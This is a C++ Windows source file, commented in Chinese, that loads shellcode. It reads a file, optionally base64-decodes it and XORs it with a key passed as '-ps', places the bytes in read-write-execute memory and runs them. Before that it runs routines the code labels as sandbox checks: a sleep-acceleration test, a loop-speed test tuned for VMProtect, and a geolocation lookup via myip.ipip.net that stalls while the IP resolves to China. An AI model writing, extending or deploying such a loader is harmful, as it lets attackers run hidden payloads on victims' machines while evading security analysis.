#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <numeric>
#include <functional>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <sstream>  
#include <iostream>
#include <cstdlib>
#include <string>
#include <memory>
#include <stdexcept>
#include <array>
#include <windows.h>
#include <fstream>
#include <cstring>
#include <iostream>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <fcntl.h>
#include <io.h>
#include <cstring>
using namespace std;

void isTimeAccelerated() {
    auto start = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto end = std::chrono::steady_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    while (duration.count() < 5000) {
        std::cout << "F" << std::endl;

        double* pvalue = NULL; // 初始化为 null 的指针
        pvalue = new double;   // 为变量请求内存

        *pvalue = 29494.99;     // 在分配的地址存储值

        delete pvalue;         // 释放内存
    }
}

void ddt() {
    while (true) {
        using namespace std::chrono;

        // 初始变量
        int counter = 1;

        // 获取当前时间点
        auto start_time = high_resolution_clock::now();

        // 持续加1直到5秒过去
        while (true) {
            // 获取当前时间
            auto current_time = high_resolution_clock::now();

            // 计算过去的时间
            auto duration = duration_cast<seconds>(current_time - start_time);

            // 如果5秒已经过去，则退出循环
            if (duration.count() >= 5) {
                break;
            }

            // 增加变量
            counter++;
        }

        // 输出结果
        //std::cout << "在5秒内，变量从1增加到：" << counter << std::endl;
        std::cout << counter << std::endl;

        //while (counter < 90000000) {
        //0.9亿是没有使用vmp的,3万是给使用vmp的
        if (counter > 90000000) {
            break;
        }

        std::cout << "D" << std::endl;

        double* pvalue = NULL; // 初始化为 null 的指针
        pvalue = new double;   // 为变量请求内存

        *pvalue = 29494.99;     // 在分配的地址存储值

        delete pvalue;         // 释放内存
    }
    //return ;
}

void ip() {
    while (true) {

        // 执行 curl 命令，并获取输出
        const char* cmd = "curl -s https://myip.ipip.net/";

        // 将 char* 转换为 wchar_t*（使用安全函数 mbstowcs_s）
        size_t cmdLength = strlen(cmd) + 1;
        std::wstring wCmd(cmdLength, L'\0');
        size_t convertedChars = 0;

        // 使用 mbstowcs_s 转换 char* 到 wchar_t*
        errno_t err = mbstowcs_s(&convertedChars, &wCmd[0], wCmd.size(), cmd, cmdLength);
        if (err != 0) {
            std::cerr << "Error converting char* to wchar_t*.\n";
            return;
        }

        // 设置命令行的输出缓冲区
        std::array<char, 128> buffer;
        std::string result;

        // 通过 CreateProcess 执行命令
        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.lpSecurityDescriptor = NULL;
        saAttr.bInheritHandle = TRUE;

        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
            std::cerr << "Failed to create pipe\n";
            return;
        }

        PROCESS_INFORMATION piProcInfo;
        STARTUPINFO siStartInfo;
        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

        siStartInfo.cb = sizeof(STARTUPINFO);
        siStartInfo.hStdOutput = hWritePipe;
        siStartInfo.hStdError = hWritePipe;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        // 创建进程，使用宽字符版本的 CreateProcessW
        if (!CreateProcessW(NULL, &wCmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
            std::cerr << "CreateProcess failed\n";
            return;
        }

        // 关闭写管道
        CloseHandle(hWritePipe);

        // 读取命令的输出
        DWORD dwRead;
        char szBuffer[4096];
        while (true) {
            if (!ReadFile(hReadPipe, szBuffer, sizeof(szBuffer) - 1, &dwRead, NULL) || dwRead == 0)
                break;
            szBuffer[dwRead] = '\0';  // 确保读取的数据是以 \0 结束的字符串
            result += szBuffer;
        }

        // 等待进程结束
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);

        // 关闭句柄
        CloseHandle(hReadPipe);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        // 检查输出内容中是否包含 "中国"
        if (result.find("中国") == std::string::npos) {
            break;
        }

        using namespace std::chrono;

        // 获取当前时间点
        auto start_time = high_resolution_clock::now();

        while (true) {
            // 获取当前时间
            auto current_time = high_resolution_clock::now();

            // 计算过去的时间
            auto duration = duration_cast<seconds>(current_time - start_time);

            // 如果3秒已经过去，则退出循环
            if (duration.count() >= 3) {
                break;
            }
        }
    }
}

//int decryptKey(int diff, int minValue, int maxValue) {

  //  for (int num = minValue; num <= maxValue; num++) {

    //    int randomValue = diff + num;

      //  if (520519 < randomValue && randomValue < 520521) {
        //    return randomValue;
        //}
    //}

//}

//std::string xorDecrypt(const std::string& data, const std::string& key) {

  //  std::string decryptedData;
    //for (std::size_t i = 0; i < data.length(); ++i) {
      //  decryptedData += data[i] ^ key[i % key.length()];
    //}
    //return decryptedData;
//}


//void RingQ(const std::string& file_path) {
//
  //  const char* filePath = "main.txt"; // 你的 shellcode 文件路径
  //  std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);


    // 获取文件大小
 //   std::streamsize byte_sequence_length = shellcodeFile.tellg();
 //   shellcodeFile.seekg(0, std::ios::beg);

    // 分配内存并读取文件内容到内存中
//    char* byte_sequence = new char[byte_sequence_length];

    // 分配可执行内存
//    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 将文件内容拷贝到分配的内存
  //  memcpy(execMemory, byte_sequence, byte_sequence_length);
 //   delete[] byte_sequence;

    // 将内存地址转换为函数指针
    //typedef void (*ShellcodeFunc)();
   // ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

    // 执行 shellcode
    //shellcodeFunc();

    // 释放分配的内存
    //VirtualFree(execMemory, 0, MEM_RELEASE);

//}

// Base64 解码函数
//std::vector<unsigned char> base64_decode(const std::string& in) {
  //  std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    //size_t len = in.size();
    //size_t padding = 0;
   // if (len > 1 && in[len - 1] == '=') padding++;
    //if (len > 2 && in[len - 2] == '=') padding++;

    //size_t decoded_size = (len * 3) / 4 - padding;
   // std::vector<unsigned char> decoded_data(decoded_size);

    //int val = 0, valb = -8;
   // size_t j = 0;

 //   for (size_t i = 0; i < len; ++i) {
   //     char c = in[i];
     //   if (c == '=' || base64_chars.find(c) == std::string::npos) continue;

//        val = (val << 6) + base64_chars.find(c);
  //      valb += 6;
    //    if (valb >= 0) {
      //      decoded_data[j++] = (val >> valb) & 0xFF;
        //    valb -= 8;
        //}
//    }
  //  return decoded_data;
//}

// Base64 解码函数
std::vector<unsigned char> base64_decode(const std::string& encoded_string) {
    const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    std::vector<unsigned char> ret;
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_ < in_len) {
        char c = encoded_string[in_];
        if (c == '=') break;
        size_t pos = base64_chars.find(c);
        if (pos == std::string::npos) {
            ++in_;
            continue;
        }
        char_array_4[i++] = c;
        ++in_;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; j < i - 1; j++)
            ret.push_back(char_array_3[j]);
    }

    return ret;
}

// 应用偏移量（异或操作）
void apply_xor(std::vector<unsigned char>& data, const std::string& ps) {
    if (ps.empty()) return;
    size_t ps_len = ps.size();
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= static_cast<unsigned char>(ps[i % ps_len]);
    }
}

int main(int argc, char* argv[]) {
    // 检查参数
    if (argc < 3 || std::strcmp(argv[1], "-file") != 0) {
        std::cerr << "ERROR: " << argv[0] << "   " << std::endl;
        return -1;
    }

    //检查是否在 沙盒 中运行
    isTimeAccelerated();
    ddt();
    ip();

    // 获取文件路径
    const char* filePath = argv[2];
    std::ifstream inputFile(filePath, std::ios::binary | std::ios::ate);

    if (!inputFile.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return -1;
    }

    // 获取文件大小
    std::streamsize fileSize = inputFile.tellg();
    inputFile.seekg(0, std::ios::beg);

    // 读取文件内容
    std::vector<unsigned char> fileData(fileSize);
    if (!inputFile.read(reinterpret_cast<char*>(fileData.data()), fileSize)) {
        std::cerr << "Failed to read file: " << filePath << std::endl;
        return -1;
    }

    // 检查是否有 -ps 参数
    std::string ps;
    for (int i = 3; i < argc; ++i) {
        if (std::strcmp(argv[i], "-ps") == 0 && i + 1 < argc) {
            ps = argv[i + 1];
            break;
        }
    }

    // 如果有 -ps 参数，进行 Base64 解码和应用偏移量
    if (!ps.empty()) {
        std::string encodedData(fileData.begin(), fileData.end());
        fileData = base64_decode(encodedData);
        apply_xor(fileData, ps);
    }

    // 分配可执行内存
    LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        std::cerr << "Failed to allocate memory." << std::endl;
        return -1;
    }

    // 将文件内容拷贝到分配的内存
    memcpy(execMemory, fileData.data(), fileData.size());

    // 将内存地址转换为函数指针
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

    // 执行 shellcode
    shellcodeFunc();

    // 释放分配的内存
    VirtualFree(execMemory, 0, MEM_RELEASE);

    return 0;
}
